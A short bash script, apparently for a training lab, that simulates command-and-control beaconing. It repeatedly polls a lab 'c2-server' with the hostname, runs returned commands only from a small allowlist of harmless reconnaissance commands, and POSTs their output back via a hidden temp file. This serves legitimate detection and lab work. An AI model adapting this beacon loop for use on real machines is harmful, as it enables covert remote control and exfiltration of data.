#!/bin/bash
# SIMULATED command-and-control beaconing (lab only).
# Polls the lab C2 container every 2-4 s and runs the harmless command it returns.
# Usage: beacon.sh <seconds>
DUR=${1:-300}; END=$((SECONDS + DUR))
while [ $SECONDS -lt $END ]; do
  CMD=$(curl -s -m 2 "http://c2-server:9000/beat?h=$(hostname)")
  case "$CMD" in
    id|whoami|"uname -a"|hostname|"ls /tmp") sh -c "$CMD" > /tmp/.c2out 2>&1 ;;
  esac
  curl -s -m 2 -X POST --data-binary @/tmp/.c2out "http://c2-server:9000/out?h=$(hostname)" > /dev/null
  sleep $((RANDOM % 3 + 2))
done
rm -f /tmp/.c2out
